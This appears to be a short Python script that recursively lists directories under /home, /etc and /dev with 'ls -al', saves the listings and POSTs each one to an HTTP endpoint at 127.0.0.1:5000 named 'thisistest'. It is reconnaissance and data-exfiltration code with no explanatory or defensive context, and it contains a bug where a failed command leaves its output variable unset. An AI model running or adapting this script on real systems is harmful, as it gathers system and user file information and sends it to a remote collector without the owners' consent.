import os, subprocess, time
import requests

url = 'http://127.0.0.1:5000/thisistest'

paths = ['/home', '/etc', '/dev']

for directory in paths:
    s = directory[1:]
    writeFile = open('ls_filesys_%s.txt' % s, 'wb')
    for root, dirs, files in os.walk(directory):
        for subdir in dirs:
            dirpath = os.path.join(root, subdir)
            try:
                proc = subprocess.check_output(["ls", "-al", dirpath])
            except:
                print("Failed to run ls -al command.")
            if proc is not None:
                writeFile.write(str(proc))
                try:
                    res = requests.post(url, data=proc)
                    print("Sent file")
                except:
                    print("Failed to post to the server.")
    writeFile.close()
